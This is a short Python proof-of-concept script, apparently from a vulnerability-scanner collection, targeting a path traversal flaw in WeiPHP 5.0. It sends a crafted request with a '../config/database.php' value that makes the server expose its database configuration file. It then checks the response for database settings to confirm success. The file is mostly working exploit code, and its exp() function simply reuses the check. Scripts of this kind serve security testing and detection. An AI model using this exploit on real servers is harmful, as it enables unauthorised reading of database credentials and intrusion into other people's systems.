import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WeiPHP 5.0 Path Traversal''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["weiphp", "lfi", "cnvd", "cnvd2020"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"""
        method = "POST"
        data = """"1":1"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/public/index.php/home/file/user_pics"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""https://weiphp.cn""" in resp1.text and """WeiPHP""" in resp1.text and """DB_PREFIX""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url